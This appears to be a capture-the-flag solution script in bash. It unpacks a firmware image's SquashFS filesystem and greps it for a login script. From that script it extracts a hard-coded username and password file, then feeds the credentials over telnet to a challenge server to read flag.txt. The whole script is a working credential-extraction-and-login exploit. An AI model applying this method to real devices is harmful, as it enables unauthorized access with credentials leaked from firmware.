#!/bin/bash

#OFFSET=`binwalk firmware.bin | grep Squash | cut -d ' ' -f 1`
#dd bs=1 skip=$OFFSET if=firmware.bin of=squashfs
#sudo unsquashfs squashfs
SEARCH=`sudo grep -R login squashfs-root 2>/dev/null | grep sign`
SCRIPT_PATH=`echo $SEARCH | cut -d : -f 1`
LOGIN=`cat $SCRIPT_PATH | grep -e '-u' | cut -d ' ' -f 5 | cut -d ':' -f 1`
PASS_FILE='squashfs-root'`cat $SCRIPT_PATH | grep sign= | cut -d ' ' -f 2 | cut -d '\`' -f 1`
PASSWD=`cat $PASS_FILE`
(sleep 1; echo $LOGIN; sleep 1; echo $PASSWD; sleep 2; echo "cat flag.txt"; sleep 1;) | telnet 206.189.28.151 31424
